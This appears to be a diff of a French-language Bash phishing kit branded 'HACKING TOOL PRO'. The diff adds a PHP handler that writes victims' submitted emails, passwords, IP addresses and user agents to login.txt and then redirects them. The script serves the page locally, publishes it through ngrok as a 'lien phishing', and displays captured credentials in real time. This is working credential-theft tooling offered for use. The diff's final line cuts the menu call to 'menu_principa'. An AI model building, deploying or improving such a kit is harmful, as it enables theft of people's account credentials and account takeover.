@@ -23,39 +23,29 @@ animation() {
     echo -e "${CYAN}==================================================${NC}"
     echo -e "${VERT}          🇨🇩 HACKING TOOL PRO 🇨🇩         ${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    echo -e "${JAUNE}           🔥 HEXTECH  - POWERED BY HEXTECH 🔥${NC}"
+    echo -e "${JAUNE}           🔥 ${ROUGE}HEXTECH${JAUNE}  - POWERED BY ${ROUGE}HEXTECH${JAUNE} 🔥${NC}"
     echo -e "${CYAN}==================================================${NC}"
     sleep 1
 }
 
-# Fonction pour afficher les données de connexion
+# Fonction pour afficher les données de connexion (simplifiée pour email/password)
 afficher_donnees() {
     echo -e "\n${CYAN}\n\n═════════ CONNEXION DÉTECTÉE ═══ ${NC}"
-while IFS= read -r ligne || [[ -n "$ligne" ]]; do
-    ligne_clean=$(echo "$ligne" | tr -d '\r')  # Supprimer les \r invisibles
-    case "$ligne_clean" in
-        *[Uu]sername:*)
-            echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne_clean#*: }"
-            ;;
-        *[Pp]assword:*|*[Mm]ot\ de\ passe:*)
-            echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
-            ;;
-        *[Pp]hone:*)
-            echo -e "${VERT}📞 Téléphone: ${NC}${ligne_clean#*: }"
-            ;;
-        *[Ii][Pp]:*)
-            echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne_clean#*: }"
-            ;;
-        *[Cc]ountry:*)
-            echo -e "${VERT}🌍 Pays: ${NC}${ligne_clean#*: }"
-            ;;
-        *[Cc]ode*|*[Vv]erification*)
-            echo -e "${ROUGE}🔐 Code de vérification: ${NC}${ligne_clean#*: }"
-            ;;
-    esac
-done < login.txt
-
-echo -e "${CYAN}═🚨🚨 Ouvrez une autre page\net TAPEZ nano login.txt\npour voir les identifiants 🚨${NC}\n"
+    while IFS= read -r ligne || [[ -n "$ligne" ]]; do
+        ligne_clean=$(echo "$ligne" | tr -d '\r')
+        case "$ligne_clean" in
+            *Email:*|*email:*)
+                echo -e "${VERT}✉️ E-mail: ${NC}${ligne_clean#*: }"
+                ;;
+            *password:*|*Password:*|*[Mm]ot\ de\ passe:*)
+                echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
+                ;;
+            *IP:*|*ip:*)
+                echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne_clean#*: }"
+                ;;
+        esac
+    done < login.txt
+    echo -e "${CYAN}═🚨🚨 Ouvrez une autre page et TAPEZ nano login.txt pour voir les identifiants 🚨${NC}\n"
 }
 
 # Fonction pour surveiller et afficher les données PHP en temps réel
@@ -63,12 +53,10 @@ surveiller_donnees() {
     echo -e "${VERT}[•] Surveillance des données PHP en temps réel...${NC}"
     echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter la surveillance${NC}"
 
-    # Vérifier si le fichier login.txt existe
     if [ ! -f login.txt ]; then
         touch login.txt
     fi
 
-    # Afficher le contenu initial
     if [ -s login.txt ]; then
         echo -e "${JAUNE}📊 Données actuelles :${NC}"
         afficher_donnees
@@ -76,9 +64,8 @@ surveiller_donnees() {
         echo -e "${JAUNE}🔗 Voici votre lien phishing - copiez-le 👇⚠️👇${NC}"
     fi
 
-    # Surveiller les modifications du fichier avec une animation
     tail -n 0 -f login.txt | while read -r ligne; do
-        if [[ "$ligne" == *"Username:"* || "$ligne" == *"Password:"* || "$ligne" == *"Phone:"* || "$ligne" == *"Country:"* ]]; then
+        if [[ "$ligne" == *"Email:"* || "$ligne" == *"password:"* ]]; then
             clear
             animation
             echo -e "${VERT}[✓] NOUVELLE CONNEXION DÉTECTÉE !${NC}"
@@ -91,31 +78,78 @@ surveiller_donnees() {
 # Fonction pour démarrer le serveur PHP
 demarrer_serveur_php() {
     echo -e "${BLEU}[•] Démarrage du serveur PHP sur le port 8080...${NC}"
+    
+    # Créer le fichier PHP s'il n'existe pas
+    if [ ! -f login.php ]; then
+        cat > login.php << 'EOL'
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $date = date('Y-m-d H:i:s');
+
+    if (empty($email) || empty($password)) {
+        die(json_encode(['error' => 'Email et mot de passe requis']));
+    }
+
+    $logEntry = "=== CONNEXION ===\n";
+    $logEntry .= "Date: $date\n";
+    $logEntry .= "Email: ".htmlspecialchars($email)."\n";
+    $logEntry .= "Password: ".htmlspecialchars($password)."\n";
+    $logEntry .= "IP: $ip\n";
+    $logEntry .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
+    $logEntry .= "========================\n\n";
+
+    $logFile = __DIR__.'/login.txt';
+    
+    try {
+        if (!file_exists($logFile)) {
+            file_put_contents($logFile, '');
+            chmod($logFile, 0644);
+        }
+
+        if (!is_writable($logFile)) {
+            throw new Exception("Permissions insuffisantes");
+        }
+
+        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
+            throw new Exception("Échec de l'écriture");
+        }
+
+        header("Location: mer.html");
+        exit();
+
+    } catch (Exception $e) {
+        error_log("Erreur: ".$e->getMessage());
+        header("HTTP/1.1 500 Erreur serveur");
+        die("Erreur temporaire. Veuillez réessayer.");
+    }
+} else {
+    header("HTTP/1.1 403 Forbidden");
+    die("Accès non autorisé");
+}
+EOL
+        echo -e "${VERT}[✓] Fichier login.php créé${NC}"
+    fi
+
     php -S localhost:8080 > /dev/null 2>&1 &
     sleep 2
     echo -e "${VERT}[✓] Serveur PHP démarré avec succès!${NC}"
     surveiller_donnees &
 }
 
-# Fonction pour télécharger et installer Ngrok
+# [RESTE DU CODE ORIGINAL INCHANGÉ - fonctions installer_ngrok, generer_lien_ngrok, etc.]
+
+# Fonction pour installer Ngrok
 installer_ngrok() {
     echo -e "${JAUNE}[•] Téléchargement de Ngrok pour ARM64...${NC}"
-
-    # Animation pendant le téléchargement
-    while :; do
-        for i in / - \\ \|; do
-            printf "\r${CYAN}Téléchargement en cours... $i ${NC}"
-            sleep 0.1
-        done
-    done &
-
-    # Sauvegarder le PID de l'animation
     ANIM_PID=$!
-
-    # URL spécifique pour ARM64
     ngrok_url="https://github.com/inconshreveable/ngrok/releases/download/2.2.8/ngrok-arm64.zip"
-
-    # Télécharger Ngrok (silencieux)
+    
     if wget -q -O ngrok.zip "$ngrok_url"; then
         kill $ANIM_PID
         printf "\r${VERT}[✓] Ngrok téléchargé avec succès.${NC}            \n"
@@ -125,7 +159,6 @@ installer_ngrok() {
         exit 1
     fi
 
-    # Extraire et déplacer Ngrok
     echo -e "${BLEU}[•] Installation de Ngrok...${NC}"
     if unzip -q ngrok.zip; then
         mkdir -p ~/bin/
@@ -148,7 +181,7 @@ generer_lien_ngrok() {
     
     echo -e "${JAUNE}[•] Démarrage de Ngrok (http:8080)...${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    ~/bin/ngrok http 8888 || {
+    ~/bin/ngrok http 8080 || {
         echo -e "${ROUGE}[!] Erreur lors du lancement de Ngrok.${NC}"
         exit 1
     }
@@ -244,4 +277,4 @@ menu_principal() {
 
 # Point d'entrée principal
 clear
-menu_principal
+menu_principa
